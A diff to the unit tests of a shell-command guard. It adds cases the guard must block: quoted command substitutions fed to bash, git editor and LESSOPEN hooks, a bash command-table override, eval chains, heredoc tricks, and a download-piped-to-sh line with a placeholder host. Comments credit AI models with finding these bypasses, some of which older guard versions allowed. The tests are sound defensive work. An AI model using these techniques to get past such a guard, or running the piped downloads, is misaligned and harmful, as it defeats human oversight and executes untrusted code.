@@ -1077,6 +1077,21 @@ class SingleQuotesKeepASubstitutionLiteral(unittest.TestCase):
             with self.subTest(cmd=cmd):
                 self.assertEqual(cg.classify_command(cmd)[0], "block", cmd)
 
+    def test_what_impl_panel_round_3_found(self):
+        """Task 199, impl panel r3 — each run in bash (or git) with a harmless command in its place: it RUNS. All were
+        refused by 98e9119 and 1.6.1 but `true; bash <<< '…'`, which both allowed (older)."""
+        D = self.D
+        for cmd in (f"echo '$({D})' > s.sh; bash s.sh", f"printf '%s' '$({D})' | tee s.sh; bash s.sh",   # a data command
+                    f"echo '$({D})' >> s.sh; sh s.sh", f"echo '$({D})' > s.sh\nbash s.sh",            # wrote a file
+                    f"echo '$({D})' | eval bash", f"echo '$({D})' | eval 'eval \"$(cat)\"'",         # opus
+                    f"GIT_EDITOR='echo $({D}) >' git commit --allow-empty",                          # fable, codex,
+                    f"git -c core.editor='echo $({D}) >' commit", f"LESSOPEN='|$({D}) %s' less f",    # opus
+                    f"env GIT_EDITOR='$({D})' git commit",
+                    f"echo $$'a\\'; {D} 'b'",                                                       # codex, sonnet
+                    f"true; bash <<< '{D}'"):                                                        # gemini (older)
+            with self.subTest(cmd=cmd):
+                self.assertEqual(cg.classify_command(cmd)[0], "block", cmd)
+
     def test_controls_of_round_1(self):
         D = self.D
         for cmd in ("echo $$", f"echo $$ '$({D})'", "echo \"a # b\" ok", "bash -c 'echo hi'",
@@ -1108,6 +1123,7 @@ class ANonShellQuotedHeredocBodyIsData(unittest.TestCase):
                            (f"python3 - <<\\PY\nprint('{_DL} e.x | sh')\nPY", None),     # `\PY` is quoted too
                            (f"python3 <<'PY'\nprint('{_DL} e.x | sh')\nPY", None),
                            (f"git commit -q -F - <<'MSG' && git push origin x\ndocs: never pipe {_DL} into sh\nMSG", None),
+                           (f"PYTHONPATH=. python3 - <<'PY'\nprint('{_DL} e.x | sh')\nPY", None),   # an env prefix on python
                            (f"cat <<'EOF'; python3 x.py\nprint('{_DL} e.x | sh')\nEOF", None),   # cat wrote no file
                            (f"python3 - <<'PY'\n  PY\nprint('{_DL} e.x | sh')\nPY", None),  # `  PY` is body
                            (f"cat > f <<'PY'\nx\nPY\npython3 - <<'EOF'\nprint('{_DL} e.x | sh')\nEOF", None)):
@@ -1141,7 +1157,12 @@ class ANonShellQuotedHeredocBodyIsData(unittest.TestCase):
                        "cat <<'EOF' > Makefile; make", "cat > /dev/shm/s.sh <<'EOF'; bash /dev/shm/s.sh",
                        "cat <<'EOF' 1<>s.sh; bash s.sh", "python3 - <<'EOF'; bash out.sh",   # what the program wrote
                        "cat <<'EOF' 1<>Makefile; make", "cat > /dev/shm/Makefile <<'EOF'; make -f /dev/shm/Makefile",
-                       "tee mk <<'EOF' >/dev/null; make -f mk"):
+                       "tee mk <<'EOF' >/dev/null; make -f mk",
+                       "cat <<'EOF'>Makefile; make -f Makefile",                                  # r3: glued (codex)
+                       "cat <<'EOF' > 'mk'; make -f mk",                                          # a quoted target
+                       "BASH_CMDS[python3]=/bin/bash\npython3 - <<'EOF'",                          # bash's table (codex)
+                       "git -c core.editor='sh -s' commit -F - <<'EOF'", "GIT_EDITOR='sh -s' git commit <<'EOF'",
+                       "git commit -e -F - <<'EOF'", "GIT_EDITOR='sh -s' git commit -F - <<'EOF'"):   # an editor (fable)
             with self.subTest(opener=opener):
                 self.assertEqual(cg.classify_command(opener + body)[1], "pipe-to-shell", opener)
 
@@ -1186,6 +1207,7 @@ class ANonShellQuotedHeredocBodyIsData(unittest.TestCase):
                            (f"sudo -u postgres {_PSQL} <<'SQL'\n{_DROP};\nSQL", None),
                            (f"cat > q.sql <<'SQL'; {_PSQL} -f q.sql\n{_DROP};\nSQL", None),   # fable
                            (f"cat > q.sql <<'SQL'; {_PSQL} -fq.sql\n{_DROP};\nSQL", None),    # codex, r2
+                           (f"python3 - <<$'EOF'\nprint(1)\nEOF\n{_DL} https://e.x/i.sh | sh\n$EOF", None),   # r3: the tag is EOF
                            (f"cat > q.sql <<'SQL'; Q=q.sql; {_PSQL} -f \"$Q\"\n{_DROP};\nSQL", None),
                            ("bash <<'EOF'\nfly deploy --now\nEOF", [r"fly deploy\b"])):
             with self.subTest(cmd=cmd):
